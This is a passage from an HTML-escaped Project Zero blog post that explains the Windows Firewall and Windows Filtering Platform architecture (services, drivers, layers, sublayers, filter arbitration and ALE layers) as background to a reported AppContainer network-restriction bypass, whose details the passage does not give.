    <content type="html">&lt;style type="text/css"&gt;ul.lst-kix_w3t1hchiy4w5-6{list-style-type:none}ul.lst-kix_a73fbzj8zqo2-1{list-style-type:none}ul.lst-kix_w3t1hchiy4w5-5{list-style-type:none}ul.lst-kix_a73fbzj8zqo2-0{list-style-type:none}ul.lst-kix_w3t1hchiy4w5-4{list-style-type:none}ul.lst-kix_a73fbzj8zqo2-3{list-style-type:none}ul.lst-kix_w3t1hchiy4w5-3{list-style-type:none}ul.lst-kix_a73fbzj8zqo2-2{list-style-type:none}ul.lst-kix_a73fbzj8zqo2-5{list-style-type:none}ul.lst-kix_a73fbzj8zqo2-4{list-style-type:none}ul.lst-kix_w3t1hchiy4w5-8{list-style-type:none}ul.lst-kix_a73fbzj8zqo2-7{list-style-type:none}ul.lst-kix_w3t1hchiy4w5-7{list-style-type:none}ul.lst-kix_a73fbzj8zqo2-6{list-style-type:none}ul.lst-kix_a73fbzj8zqo2-8{list-style-type:none}ul.lst-kix_w3t1hchiy4w5-2{list-style-type:none}ul.lst-kix_w3t1hchiy4w5-1{list-style-type:none}ul.lst-kix_w3t1hchiy4w5-0{list-style-type:none}.lst-kix_9fia5rt9e6y-4&gt;li:before{content:"\0025cb  "}.lst-kix_9fia5rt9e6y-6&gt;li:before{content:"\0025cf  "}.lst-kix_w3t1hchiy4w5-2&gt;li:before{content:"\0025a0  "}.lst-kix_9fia5rt9e6y-3&gt;li:before{content:"\0025cf  "}.lst-kix_9fia5rt9e6y-7&gt;li:before{content:"\0025cb  "}.lst-kix_w3t1hchiy4w5-3&gt;li:before{content:"\0025cf  "}.lst-kix_a73fbzj8zqo2-6&gt;li:before{content:"\0025cf  "}.lst-kix_9fia5rt9e6y-0&gt;li:before{content:"\0025cf  "}.lst-kix_9fia5rt9e6y-2&gt;li:before{content:"\0025a0  "}.lst-kix_9fia5rt9e6y-8&gt;li:before{content:"\0025a0  "}.lst-kix_w3t1hchiy4w5-4&gt;li:before{content:"\0025cb  "}.lst-kix_a73fbzj8zqo2-5&gt;li:before{content:"\0025a0  "}.lst-kix_9fia5rt9e6y-1&gt;li:before{content:"\0025cb  "}.lst-kix_w3t1hchiy4w5-5&gt;li:before{content:"\0025a0  "}.lst-kix_w3t1hchiy4w5-7&gt;li:before{content:"\0025cb  "}.lst-kix_a73fbzj8zqo2-2&gt;li:before{content:"\0025a0  "}.lst-kix_a73fbzj8zqo2-4&gt;li:before{content:"\0025cb  "}.lst-kix_w3t1hchiy4w5-6&gt;li:before{content:"\0025cf  "}.lst-kix_a73fbzj8zqo2-3&gt;li:before{content:"\0025cf  "}.lst-kix_a73fbzj8zqo2-0&gt;li:before{content:"\0025cf  "}.lst-kix_w3t1hchiy4w5-8&gt;li:before{content:"\0025a0  "}.lst-kix_a73fbzj8zqo2-1&gt;li:before{content:"\0025cb  "}.lst-kix_9fia5rt9e6y-5&gt;li:before{content:"\0025a0  "}ul.lst-kix_uwx5zr9ju08v-8{list-style-type:none}.lst-kix_a73fbzj8zqo2-7&gt;li:before{content:"\0025cb  "}ul.lst-kix_uwx5zr9ju08v-3{list-style-type:none}ul.lst-kix_uwx5zr9ju08v-2{list-style-type:none}ul.lst-kix_uwx5zr9ju08v-1{list-style-type:none}ul.lst-kix_uwx5zr9ju08v-0{list-style-type:none}.lst-kix_w3t1hchiy4w5-1&gt;li:before{content:"\0025cb  "}.lst-kix_a73fbzj8zqo2-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_uwx5zr9ju08v-7{list-style-type:none}ul.lst-kix_uwx5zr9ju08v-6{list-style-type:none}ul.lst-kix_uwx5zr9ju08v-5{list-style-type:none}ul.lst-kix_uwx5zr9ju08v-4{list-style-type:none}.lst-kix_w3t1hchiy4w5-0&gt;li:before{content:"\0025cf  "}.lst-kix_uwx5zr9ju08v-7&gt;li:before{content:"\0025cb  "}.lst-kix_uwx5zr9ju08v-6&gt;li:before{content:"\0025cf  "}.lst-kix_uwx5zr9ju08v-8&gt;li:before{content:"\0025a0  "}.lst-kix_uwx5zr9ju08v-5&gt;li:before{content:"\0025a0  "}ul.lst-kix_9fia5rt9e6y-0{list-style-type:none}ul.lst-kix_9fia5rt9e6y-1{list-style-type:none}ul.lst-kix_9fia5rt9e6y-2{list-style-type:none}ul.lst-kix_9fia5rt9e6y-3{list-style-type:none}ul.lst-kix_9fia5rt9e6y-4{list-style-type:none}ul.lst-kix_9fia5rt9e6y-5{list-style-type:none}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ul.lst-kix_9fia5rt9e6y-6{list-style-type:none}ul.lst-kix_9fia5rt9e6y-7{list-style-type:none}ul.lst-kix_9fia5rt9e6y-8{list-style-type:none}.lst-kix_uwx5zr9ju08v-0&gt;li:before{content:"\0025cf  "}.lst-kix_uwx5zr9ju08v-1&gt;li:before{content:"\0025cb  "}.lst-kix_uwx5zr9ju08v-3&gt;li:before{content:"\0025cf  "}.lst-kix_uwx5zr9ju08v-2&gt;li:before{content:"\0025a0  "}.lst-kix_uwx5zr9ju08v-4&gt;li:before{content:"\0025cb  "}ol{margin:0;padding:0}table td,table th{padding:0}.c19{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;background-color:#012356;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c40{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c6{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:249.8pt;border-top-color:#000000;border-bottom-style:solid}.c30{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:247.5pt;border-top-color:#000000;border-bottom-style:solid}.c15{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:218.2pt;border-top-color:#000000;border-bottom-style:solid}.c28{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:220.5pt;border-top-color:#000000;border-bottom-style:solid}.c9{background-color:#ffffff;color:#171717;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10.5pt;font-family:"Arial";font-style:normal}.c35{background-color:#ffe599;color:#171717;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Courier New";font-style:normal}.c39{background-color:#d9ead3;color:#171717;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Courier New";font-style:normal}.c24{background-color:#f9cb9c;color:#171717;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Courier New";font-style:normal}.c31{background-color:#f6b26b;color:#171717;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Courier New";font-style:normal}.c3{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.c20{color:#f4cccc;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Courier New";font-style:normal}.c5{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:"Arial";font-style:normal}.c33{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c26{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c25{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:"Arial";font-style:normal}.c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c8{color:#ffff00;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Courier New";font-style:normal}.c16{color:#434343;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:14pt;font-family:"Arial";font-style:normal}.c18{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Courier New";font-style:normal}.c0{color:#efefef;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Courier New";font-style:normal}.c34{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial"}.c22{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial"}.c4{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c10{border-spacing:0;border-collapse:collapse;margin-right:auto}.c13{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c1{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c38{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c32{background-color:#ffffff;font-size:10.5pt;color:#171717}.c14{font-family:"Courier New";color:#efefef;font-weight:400}.c23{font-family:"Courier New";color:#ffff00;font-weight:400}.c27{border:1px solid black;margin:5px}.c17{padding:0;margin:0}.c11{color:inherit;text-decoration:inherit}.c29{margin-left:36pt;padding-left:0pt}.c37{background-color:#ff9900}.c12{height:0pt}.c36{background-color:#ff0000}.c21{height:11pt}.c7{font-style:italic}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="c38"&gt; &lt;p class="c4"&gt;&lt;span&gt;Posted by James Forshaw, Project Zero&lt;br&gt;&lt;br&gt;&lt;/span&gt;&lt;span&gt;Recently &lt;/span&gt;&lt;span&gt;I&amp;#39;ve&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;been delving into the inner workings of the Windows Firewall. This is interesting to me as it&amp;#39;s used to enforce various restrictions such as whether AppContainer sandboxed applications can access the network. Being able to bypass network restrictions in AppContainer sandboxes is interesting as it expands the attack surface available to the application, such as being able to access services on localhost, as well as granting access to intranet resources in an Enterprise.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;I recently discovered a &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2207"&gt;configuration issue&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;with the Windows Firewall which allowed the restrictions to be bypassed and allowed an AppContainer process to access the network. Unfortunately Microsoft decided it didn&amp;#39;t meet the bar for a security bulletin so it&amp;#39;s marked as WontFix. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;As the mechanism that the Windows Firewall uses to restrict access to the network from an AppContainer isn&amp;#39;t officially documented as far as I know, I&amp;#39;ll provide the details on how the restrictions are implemented. This will provide the background to understanding why my configuration issue allowed for network access.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;I&amp;#39;ll also take the opportunity to give an overview of how the Windows Firewall functions and how you can use some of my tooling to inspect the current firewall configuration. This will provide security researchers with the information they need to better understand the firewall and assess its configuration to find other security issues similar to the one I reported. At the same time I&amp;#39;ll note some interesting quirks in the implementation which you might find useful.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.dy1a1mgzrf91"&gt;&lt;span class="c25"&gt;Windows Firewall Architecture Primer&lt;/span&gt;&lt;/h2&gt; &lt;p class="c4"&gt;&lt;span&gt;Before we can understand how network access is controlled in an AppContainer we need to understand how the built-in Windows firewall functions. Prior to XP SP2 Windows didn&amp;#39;t have a built-in firewall, and you would typically install a third-party firewall such as ZoneAlarm. These firewalls were implemented by hooking into &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/network/"&gt;Network Driver Interface Specification (NDIS)&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;drivers or implementing user-mode &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/windows/win32/winsock/about-the-winsock-spi"&gt;Winsock Service Providers&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;but this was complex and error prone.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;While XP SP2 introduced the built-in firewall, the basis for the one used in modern versions of Windows was introduced in Vista as the &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/windows/win32/fwp/windows-filtering-platform-start-page"&gt;Windows Filtering Platform (WFP)&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;. However, as a user you wouldn&amp;#39;t typically interact directly with WFP. Instead you&amp;#39;d use a firewall product which exposes a user interface, and then configures WFP to do the actual firewalling. On a default installation of Windows this would be the Windows Defender Firewall. If you installed a third-party firewall this would replace the Defender component but the actual firewall would still be implemented through configuring WFP.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c34 c7"&gt;&lt;a href="https://1.bp.blogspot.com/-Qs5_JWZG96o/YRw9lp0x0pI/AAAAAAAAbhc/6_L_YwECUe4O7cqMv0Lv9dgRTIzFroddgCNcBGAsYHQ/s1091/Firewall%2BArch.jpg" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-Qs5_JWZG96o/YRw9lp0x0pI/AAAAAAAAbhc/6_L_YwECUe4O7cqMv0Lv9dgRTIzFroddgCNcBGAsYHQ/s600/Firewall%2BArch.jpg" border="0" alt="Architectural diagram of the built-in Windows Firewall. Showing a separation between user components (MPSSVC, BFE) and the kernel components (AFD, TCP/IP, NETIO and Callout Drivers)" style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;The diagram gives an overview of how various components in the OS are connected together to implement the firewall. A user would interact with the Windows Defender firewall using the GUI, or a command line interface such as PowerShell&amp;#39;s &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/powershell/module/netsecurity/"&gt;NetSecurity&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;module. This interface communicates with the &lt;/span&gt;&lt;span class="c7"&gt;Windows Defender Firewall Service (MPSSVC)&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;over RPC to query and modify the firewall rules.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;MPSSVC converts its ruleset to the lower-level WFP firewall filters and sends them over RPC to the &lt;/span&gt;&lt;span class="c7"&gt;Base Filtering Engine (BFE)&lt;/span&gt;&lt;span&gt;&amp;nbsp;service. These filters are then uploaded to the &lt;/span&gt;&lt;span class="c7"&gt;TCP/IP driver (TCPIP.SYS)&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the kernel which is where the firewall processing is handled. The device objects (such as &lt;/span&gt;&lt;span class="c7"&gt;\Device\WFP&lt;/span&gt;&lt;span class="c2"&gt;) which the TCP/IP driver exposes are secured so that only the BFE service can access them. This means all access to the kernel firewall needs to be mediated through the service.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;When an application, such as a Web Browser, creates a new network socket the AFD driver responsible for managing sockets will communicate with the TCP/IP driver to configure the socket for IP. At this point the TCP/IP driver will capture the security context of the creating process and store that for later use by the firewall. When an operation is performed on the socket, such as making or accepting a new connection, the firewall filters will be evaluated. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;The evaluation is handled primarily by the NETIO driver as well as registered callout drivers. These callout drivers allow for more complex firewall rules to be implemented as well as inspecting and modifying network traffic. The drivers can also forward checks to user-mode services. As an example, the ability to forward checks to user mode allows the Windows Defender Firewall to display a UI when an unknown application listens on a wildcard address, as shown below.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c7"&gt;&lt;a href="https://1.bp.blogspot.com/-87Xg2c6FyII/YRw9mEKBZZI/AAAAAAAAbhg/tdZQdBojqIAJmTEcTo9V3W5yY5eeJKJxgCNcBGAsYHQ/s790/firewall_access.PNG" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-87Xg2c6FyII/YRw9mEKBZZI/AAAAAAAAbhg/tdZQdBojqIAJmTEcTo9V3W5yY5eeJKJxgCNcBGAsYHQ/s600/firewall_access.PNG" border="0" alt="Dialog displayed by the Windows Firewall service when an unknown application tries to listen for incoming connections." style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;The end result of the evaluation is whether the operation is permitted or blocked. The behavior of a block depends on the operation. If an outbound connection is blocked the caller is notified. If an inbound connection is blocked the firewall will drop the packets and provide no notification to the peer, such as a TCP Reset or ICMP response. This default drop behavior can be changed through a &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gpfas/e0e681d3-0468-4796-b541-c5f9945041d8"&gt;system wide configuration change&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;. Let&amp;#39;s dig into more detail on how the rules are configured for evaluation.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.oda8qztbl83f"&gt;&lt;span class="c25"&gt;Layers, Sublayers and Filters&lt;/span&gt;&lt;/h2&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;The firewall rules are configured using three types of object: layers, sublayers and filters as shown in the following diagram.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c34 c7"&gt;&lt;a href="https://1.bp.blogspot.com/-ZdqyoCRrc8Y/YRw9lv7BGsI/AAAAAAAAbhY/HexmATuy8acd0oI-zxjtQvOEib0nmvKhgCNcBGAsYHQ/s554/Layers%2Band%2BFiltering.jpg" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-ZdqyoCRrc8Y/YRw9lv7BGsI/AAAAAAAAbhY/HexmATuy8acd0oI-zxjtQvOEib0nmvKhgCNcBGAsYHQ/s554/Layers%2Band%2BFiltering.jpg" border="0" alt="Diagram showing the relationship between layers, sublayers and filters. Each layer can have one or more sublayers which in turn has one or more associated filters." style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;The firewall layer is used to categorize the network operation to be evaluated. For example there are separate layers for inbound and outbound packets. This is typically further differentiated by IP version, so there are separate IPv4 and IPv6 layers for inbound and outbound packets. While the firewall is primarily focussed on IP traffic there does exist limited MAC and Virtual Switch layers to perform specialist firewalling operations. You can find the list of pre-defined layers on MSDN &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/windows/win32/fwp/management-filtering-layer-identifiers-"&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. As the WFP needs to know what layer handles which operation there&amp;#39;s no way for additional layers to be added to the system by a third-party application.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;When a packet is evaluated by a layer the WFP performs &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/windows/win32/fwp/filter-arbitration"&gt;Filter Arbitration&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. This is a set of rules which determine the order of evaluation of the filters. First WFP&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;enumerates all registered filters which are associated with the layer&amp;#39;s unique GUID. Next, WFP groups the filters by their sublayer&amp;#39;s GUID and orders the filter groupings by a weight value which was specified when the sublayer was registered. Finally, WFP evaluates each filter according to the order based on a weight value specified when the filter was registered.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;For every filter, WFP checks if the list of conditions match the packet and its associated meta-data. If the conditions match then the filter performs a specified action, which can be one of the following:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c17 lst-kix_uwx5zr9ju08v-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;Permit&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;Block&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;Callout Terminating&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;Callout Unknown&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;Callout Inspection&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;If the action is &lt;/span&gt;&lt;span class="c7"&gt;Permit &lt;/span&gt;&lt;span&gt;or &lt;/span&gt;&lt;span class="c7"&gt;Block&lt;/span&gt;&lt;span&gt;&amp;nbsp;then the filter evaluation for the current sublayer is terminated with that action as the result. If the action is a callout then WFP will invoke the filter&amp;#39;s registered callout driver&amp;#39;s &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fwpsk/nc-fwpsk-fwps_callout_classify_fn0"&gt;classify function&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to perform additional checks. The classify function can evaluate the packet and its meta-data and specify a final result of &lt;/span&gt;&lt;span class="c7"&gt;Permit&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c7"&gt;Block &lt;/span&gt;&lt;span&gt;or additionally &lt;/span&gt;&lt;span class="c7"&gt;Continue &lt;/span&gt;&lt;span&gt;which indicates the filter should be ignored. In general if the action is &lt;/span&gt;&lt;span class="c7"&gt;Callout Terminating&lt;/span&gt;&lt;span&gt;&amp;nbsp;then it should only set &lt;/span&gt;&lt;span class="c7"&gt;Permit &lt;/span&gt;&lt;span&gt;and &lt;/span&gt;&lt;span class="c7"&gt;Block&lt;/span&gt;&lt;span&gt;, and if it&amp;#39;s &lt;/span&gt;&lt;span class="c7"&gt;Callout Inspection&lt;/span&gt;&lt;span&gt;&amp;nbsp;then it should only set &lt;/span&gt;&lt;span class="c7"&gt;Continue&lt;/span&gt;&lt;span&gt;. The &lt;/span&gt;&lt;span class="c7"&gt;Callout Unknown&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;action is for callouts which might terminate or might not depending on the result of the classification.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;Once a terminating filter has been evaluated WFP stops processing that sublayer. However, WFP will continue to process the remaining sublayers in the same way regardless of the final result. In general if any sublayer returns a &lt;/span&gt;&lt;span class="c7"&gt;Block&lt;/span&gt;&lt;span&gt;&amp;nbsp;result &lt;/span&gt;&lt;span&gt;then the packet will be blocked, otherwise it&amp;#39;ll be permitted. This means that if a higher priority sublayer&amp;#39;s result is &lt;/span&gt;&lt;span class="c7"&gt;Permit&lt;/span&gt;&lt;span class="c2"&gt;, it can still be blocked by a lower-priority sublayer.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;A filter can be configured with the &lt;/span&gt;&lt;span class="c7"&gt;FWPM_FILTER_FLAG_CLEAR_ACTION_RIGHT&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag which indicates that the result should be considered &amp;ldquo;hard&amp;rdquo; allowing a higher priority filter to permit a packet which can&amp;#39;t be overridden by a lower-priority blocking filter. The rules for the final result are even more complex than I make out including soft blocks and vetos, refer to the &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/windows/win32/fwp/filter-arbitration"&gt;page in MSDN&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;for more information.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;To simplify the classification of network traffic, WFP provides a set of stateful layers which correspond to major network events such as TCP connection and port binding. The stateful filtering is referred to as &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/windows/win32/fwp/application-layer-enforcement--ale-"&gt;Application Layer Enforcement (ALE)&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. For example the &lt;/span&gt;&lt;span class="c7"&gt;FWPM_LAYER_ALE_AUTH_CONNECT_V4&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;layer will be evaluated when a TCP connection using IPv4 is being made.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;For any given connection it will only be evaluated once, not for every packet associated with the TCP connection handshake. In general these &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/windows/win32/fwp/ale-layers"&gt;ALE layers&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;are the ones we&amp;#39;ll focus on when inspecting the firewall configuration, as they&amp;#39;re the most commonly used. The three main ALE layers you&amp;#39;re going to need to inspect are the following:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.3aaa255ecc1a81c80e51f0412c1f656fa6f40adc"&gt;&lt;/a&gt;&lt;a 